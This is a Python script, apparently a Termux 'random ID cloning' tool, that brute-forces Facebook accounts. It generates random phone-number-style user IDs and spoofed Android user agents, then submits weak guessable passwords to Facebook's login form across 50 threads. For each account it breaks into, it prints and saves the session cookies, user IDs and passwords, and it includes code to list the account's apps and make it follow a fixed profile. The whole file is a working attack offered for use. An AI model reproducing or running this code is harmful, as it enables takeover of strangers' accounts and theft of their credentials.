# AUTHOR >: 💔𝐁𝐫𝐨𝐤𝐞𝐧🤕
# # Github: Broken_Heart_07
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://www.facebook.com/md.rayyan.50702?mibextid=ZbWKwL')
#os.system('xdg-open https://github.com/Broken-07')
logo =("""
\x1b[1;95m
\x1b[1;95m██████╗ ██████╗ \x1b[1;93m ██████╗ ██╗  ██╗\x1b[1;96m███████╗███╗   ██╗    
\x1b[1;95m██╔══██╗██╔══██╗\x1b[1;93m██╔═══██╗██║ ██╔╝\x1b[1;96m██╔════╝████╗  ██║    
\x1b[1;95m██████╔╝██████╔╝\x1b[1;93m██║   ██║█████╔╝ \x1b[1;96m█████╗  ██╔██╗ ██║    
\x1b[1;95m██╔══██╗██╔══██╗\x1b[1;93m██║   ██║██╔═██╗ \x1b[1;96m██╔══╝  ██║╚██╗██║    
\x1b[1;95m██████╔╝██║  ██║\x1b[1;93m╚██████╔╝██║  ██╗\x1b[1;96m███████╗██║ ╚████║    
\x1b[1;95m╚═════╝ ╚═╝  ╚═╝ \x1b[1;93m╚═════╝ ╚═╝  ╚═╝\x1b[1;96m╚══════╝╚═╝  ╚═══╝    


     \x1b[1;91mⵗⵗ̥̥̊̊ⵗ̥̥̥̥̊̊̊\x1b[1;93mⵗ̥̥̥̥̥̊̊̊̊ⵗ̥̥̥̥̥̥̊̊̊̊̊ⵗ̥̥̥̥̥̥̥̊̊̊̊̊\x1b[1;96mⵗ̥̥̥̥̥̥̥̥̊̊̊̊ⵗ̥̥̥̥̥̥̥̥̥̊̊̊ⵗ̥̥̥̥̥̥̥̥̥̥̊̊\x1b[1;97m💔\x1b[1;91m_\x1b[1;92m_\x1b[1;93m_\x1b[1;94m__\x1b[1;96m_\x1b[1;91m_\x1b[1;93m/\_\x1b[1;95m_\x1b[1;97m🥺\x1b[1;91mⵗ̥̥̥̥̥̥̥̥̥̥̥ⵗ̥̥̥̥̥̥̥̥̥̥̊̊ⵗ̥̥̥̥̥̥̥̥̥̊̊̊ⵗ̥̥̥̥̥̥̥̥̊̊̊̊ⵗ̥̥̥̥̥̥̥̊̊̊̊̊ⵗ̥̥̥̥̥̥̊̊̊̊̊ⵗ̥̥̥̥̥̊̊̊̊ⵗ̥̥̥̥̊̊̊ⵗ̥̥̊̊        
​                 
                 \x1b[1;97m𝐇 \x1b[1;93m𝐄 \x1b[1;96m𝐀 \x1b[1;97m𝐑 \x1b[38;5;208m𝐓


\033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱
 │ \x1b[1;92m\x1b[1;92m 𝐀𝐔𝐓𝐇𝐎𝐑          \x1b[1;92m: \x1b[1;92m𝗖𝘆𝗯𝗲𝗿-𝗡𝗶𝗹𝗼𝘆                │
 │ \x1b[1;92m\x1b[1;96m 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊        \x1b[1;96m: \x1b[1;95m𝐁𝐫\x1b[1;93m𝐨𝐤\x1b[1;96m𝐞𝐧\x1b[1;97m-\x1b[1;97m𝐇\x1b[1;93m𝐞\x1b[1;96m𝐚\x1b[1;97m𝐫\x1b[38;5;208m𝐭               │  
 │ \x1b[1;92m\x1b[1;93m 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐆𝐑𝐎𝐔𝐏  \x1b[1;93m: \x1b[1;93m𝗠𝗥-𝗠𝗘𝗧𝗔 𝗧𝗘𝗥𝗠𝗨𝗫 𝗛𝗘𝗟𝗣𝗜𝗡𝗚 𝗭𝗢𝗡𝗘│
 │ \x1b[1;92m\x1b[1;93m 𝐆𝐈𝐓𝐇𝐔𝐁          \x1b[1;97m: \x1b[1;91m\x1b[1;95m𝐁𝐫\x1b[1;93m𝐨𝐤\x1b[1;96m𝐞𝐧\x1b[1;97m_\x1b[1;97m𝐇\x1b[1;93m𝐞\x1b[1;96m𝐚\x1b[1;97m𝐫\x1b[38;5;208m𝐭_𝟬𝟳            │
 │ \x1b[1;92m\x1b[1;91m 𝐓𝐘𝐏𝐄            \x1b[1;97m: \x1b[1;91m𝗔𝘁,𝟭𝘀𝘁-𝗙𝗼𝗹𝗹𝗼𝘄 𝗺𝘆 𝗽𝗮𝗴𝗲      │
 │ \x1b[1;92m\x1b[1;96m 𝐒𝐓𝐀𝐓𝐔𝐒          \x1b[1;97m: \x1b[1;96m𝐑𝐞𝐧𝐝𝐨𝐦 𝐈'𝐝 𝐂𝐥𝐨𝐧𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬   │
\033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱ \n\n""") 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' [{xr}🤕{1}]\x1b[38;5;208m𝐂𝐡𝐨𝐨𝐬𝐞 𝐘𝐨𝐮𝐫 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 𝐂𝐨𝐝𝐞 :\x1b[1;96m ')
    print(f' [{xr}💔{x}] 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 >: \x1b[1;96m{xr}019,\x1b[1;93m017,\x1b[1;92m018,\x1b[1;96m92302, \x1b[1;95m92301,\x1b[1;92m91778{x}')
    print(" \033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[\033[0;93m{xr}🤕{x}]\033[0;92m 𝐄𝐱𝐚𝐦𝐩𝐥𝐞 >: \x1b[1;96m 10000, \033[0;93m20000, \033[0;97m50000  \n\033[0;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱\n\033[0;97m[\033[0;97m{xr}💔{x}] \x1b[1;94m 𝗥𝗮𝗻𝗱𝗼𝗺 𝗰𝗵𝗼𝗶𝗰𝗲 >:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pwx = [guru, 'bangladesh','Bangladesh','i love you','I Love You','freefire','11223344',]
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱')
        jalan('\x1b[1;95m │🆃🅾🅾🆃🅰🅻 _\x1b[1;96m 🅸🅳 : 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 = 𝟬.𝟬.𝟬.𝟭                │      ')
        jalan('\x1b[1;93m │𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭-𝐑𝐞𝐧𝐝𝐨𝐦 𝐈𝐃 𝐂𝐫𝐚𝐜𝐤 𝐒𝐜𝐚𝐧𝐧𝐢𝐧𝐠 𝐓𝐨 𝐒𝐭𝐚𝐫𝐭𝐞𝐝│')
        jalan('\x1b[1;96m │𝐏𝐥𝐞𝐚𝐬𝐞 𝐔𝐬𝐞 𝐘𝐨𝐮𝐫 𝐌𝐨𝐛𝐢𝐥𝐞 𝐃𝐚𝐭𝐚 ( \033[0;93mᯤᯤ\x1b[1;96m )\033[0;93m             │')
        jalan('\x1b[38;5;196m │𝗔𝗶𝗿𝗽𝗹𝗮𝗻𝗲 𝗠𝗼𝗱𝗲 𝗢𝗻 / 𝗢𝗙 𝗘𝘃𝗲𝗿𝘆 𝟯𝟬, 𝗦𝗲𝗰𝗼𝗻𝗱 𝗟𝗲𝘁𝗲𝗿 \x1b[38;5;208m  │  ')
        jalan('\x1b[1;93m │𝗦𝘂𝗽𝗲𝗿 𝗙𝗮𝘀𝘁𝗲𝘀𝘁 𝗦𝗽𝗲𝗲𝗱 𝗖𝗹𝗼𝗻𝗶𝗻𝗴\033[0;95m                    │ ')
        jalan('\033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;32m⊰᯽⊱\x1b[1;91m┈─\033[1;32m─╌\033[1;31m──\x1b[1;94m──\x1b[1;96m──╌\x1b[1;91m──╌\033[1;32m╌─\033[1;31m─╌\x1b[1;94m──\x1b[1;96m─╌\x1b[1;91m❊\033[1;32m╌─\033[1;31m─╌─\x1b[1;94m─╌\x1b[1;96m──\x1b[1;91m──\033[1;32m╌─\033[1;31m──\x1b[1;94m─╌─\x1b[1;96m╌─\x1b[1;91m─┈\x1b[1;96m⊰᯽⊱")
def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": 'free.facebook.com',

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": 'https://free.facebook.com/',

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?1',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?0',

            "pragma": 'no-cache',

            "priority": 'u=0',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3'}

            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(' \r\r\033[1;32m [💔𝐁𝐫𝐨𝐤𝐞𝐧🤕-OK💔] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')

                cek_apk(session,coki)

                open(' /sdcard/💔𝐁𝐫𝐨𝐤𝐞𝐧🤕 -OK.txt', 'a').write( cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print('\r\r\033[1;96m [💔𝐁𝐫𝐨𝐤𝐞𝐧🤕-CP💔]  \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n')

                open(' /sdcard/💔𝐁𝐫𝐨𝐤𝐞𝐧🤕 -CP.txt', 'a').write( cid+' | '+ps+' \n')

                cps.append(cid)

                break

            else:

                continue

        loop+=1
        brand=random.choice(['💔𝐁𝐫𝐨𝐤𝐞𝐧🤕','💔𝐁𝐫𝐨𝐤𝐞𝐧🤕',' 💔𝐁𝐫𝐨𝐤𝐞𝐧🤕 ','💔𝐁𝐫𝐨𝐤𝐞𝐧🤕',' 💔𝐁𝐫𝐨𝐤𝐞𝐧🤕 '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['💔','🤕','💔','😳','🥀','💔','🥺','💔'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r\33[1;97m [{colr}𝐁𝐫𝐨𝐤𝐞𝐧\33[1;97m]{colo}💔\33[1;90m[{colorful}{loop}\33[1;95m/\33[1;93m{tl}\33[1;96m]-[OK:{xr}{len(oks)}{x}\33[1;93m]-\33[1;93m[{emoji}] \033[0;97m "),

    

        sys.stdout.flush()

    except:

        pass

xxr()
